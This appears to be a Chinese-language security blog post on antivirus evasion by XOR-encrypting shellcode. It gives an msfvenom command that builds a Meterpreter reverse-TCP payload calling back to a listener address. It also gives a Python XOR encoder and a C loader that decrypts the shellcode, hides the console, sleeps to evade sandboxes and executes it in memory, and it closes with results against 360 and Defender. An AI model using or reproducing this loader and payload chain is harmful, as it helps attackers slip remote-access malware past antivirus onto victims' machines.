---
title: 基于对shellcode进行异或免杀
tags:
  - 免杀
---
### 基于对shellcode进行异或免杀

**PS:感谢倾旋大佬，**[ascotbe](https://www.secpulse.com/newpage/author?author_id=26488)**大佬的分享**

#### 0x01 环境配置

Win10 x64

Vs2019

Python 2.7.18

CS4.0

Msf

生成payload：

Msf：

| msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.176.129 LPORT=4444 -o payload.bin |
|---------------------------------------------------------------------------------------------|

#### 0x02 免杀原理

先对shellcode进行异或加密然后在代码中解密

#### 0x03 制作加密shellcode

使用倾旋大佬的代码进行xor加密

    import sys from argparse 
    import ArgumentParser, FileType

    def process_bin(num, src_fp, dst_fp, dst_raw):
        shellcode = ''
        shellcode_size = 0
        shellcode_raw = b''
        try:
            while True:
                code = src_fp.read(1)
                if not code:
                    break

                base10 = ord(code) ^ num
                base10_str = chr(base10)
                shellcode_raw += base10_str.encode()
                code_hex = hex(base10)
                code_hex = code_hex.replace('0x','')
                if(len(code_hex) == 1):
                code_hex = '0' + code_hex
                shellcode += '\\x' + code_hex
                shellcode_size += 1
            src_fp.close()
            dst_raw.write(shellcode_raw)
            dst_raw.close()
            dst_fp.write(shellcode)
            dst_fp.close()
            return shellcode_size
        except Exception as e:
        sys.stderr.writelines(str(e))

    def main():
        parser = ArgumentParser(prog='Shellcode X', description='[XOR The Cobaltstrike PAYLOAD.BINs] \t > Author: rvn0xsy@gmail.com')
        parser.add_argument('-v','--version',nargs='?')
        parser.add_argument('-s','--src',help=u'source bin file',type=FileType('rb'), required=True)
        parser.add_argument('-d','--dst',help=u'destination shellcode file',type=FileType('w+'),required=True)
        parser.add_argument('-n','--num',help=u'Confused number',type=int, default=90)
        parser.add_argument('-r','--raw',help=u'output bin file', type=FileType('wb'), required=True)
        args = parser.parse_args()
        shellcode_size = process_bin(args.num, args.src, args.dst, args.raw)
        sys.stdout.writelines("[+]Shellcode Size : {} \n".format(shellcode_size))

    if __name__ == "__main__":

        main()

执行如下命令获取payload.c 即shellcode

    python xorencode.py -s msf-payload.bin -d msf-payload.c -n 10 -r 123.txt 
    python xorencode.py -s cs-payload.bin -d cs-payload.c -n 10 -r cs-123.txt

生成结果如下：

![](https://fifteenblackslime.github.io/assets/pic/media2/0da9dfef4e4086c0e20a613b270507c7.png)

Payload.c内容为：

![](https://fifteenblackslime.github.io/assets/pic/media2/53d890566ef4831276da8a6585f37a7c.png)

#### 0x04 使用vs2019进行解密打包生成exe

倾旋大佬的代码及思路：

    申请内存时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性-\> 可执行
具体代码如下：

    #include <Windows.h>

    // 入口函数
    int wmain(int argc, TCHAR* argv[]) {

        ShowWindow(GetConsoleWindow(), SW_HIDE);//不显示cmd窗口

        int shellcode_size = 0; // shellcode长度
        DWORD dwThreadId; // 线程ID
        HANDLE hThread; // 线程句柄
        DWORD dwOldProtect; // 内存页属性
    /* length: 800 bytes */

        unsigned char buf[] = "生成的shellcode";


        // 获取shellcode大小
        shellcode_size = sizeof(buf);

        /* 增加异或代码 */
        for (int i = 0; i < shellcode_size; i++) {
            buf[i] ^= 10;
        }
        /*
        VirtualAlloc(
            NULL, // 基址
        800,  // 大小
            MEM_COMMIT, // 内存页状态
            PAGE_EXECUTE_READWRITE // 可读可写可执行
            );
        */

        char* shellcode = (char*)VirtualAlloc(
            NULL,
            shellcode_size,
            MEM_COMMIT,
            PAGE_READWRITE // 只申请可读可写
            //原来的属性是PAGE_EXECUTE_READWRITE
        );

        // 将shellcode复制到可读可写的内存页中
        CopyMemory(shellcode, buf, shellcode_size);

        // 这里开始更改它的属性为可执行
        VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &dwOldProtect);

        // 等待几秒，兴许可以跳过某些沙盒呢？
        Sleep(2000);

        hThread = CreateThread(
            NULL, // 安全描述符
            NULL, // 栈的大小
            (LPTHREAD_START_ROUTINE)shellcode, // 函数
            NULL, // 参数
            NULL, // 线程标志
            &dwThreadId // 线程ID
        );

        WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束
        return 0;
    }

![](https://fifteenblackslime.github.io/assets/pic/media2/507a365e287579cf8ec827c9b4413056.png)

生成release版本exe

使用过程中我添加了如下代码去除cmd窗口：

    ShowWindow(GetConsoleWindow(), SW_HIDE); 

![](https://fifteenblackslime.github.io/assets/pic/media2/75c00948267dd56d986d21f999545c3e.png)

##### 0x05免杀结果

测试杀软：360，defender

通过Msf的bin文件生成exe可以通过360检测，但无法通过defender。

通过Cobalt strike的raw文件生成exe无法通过杀软。
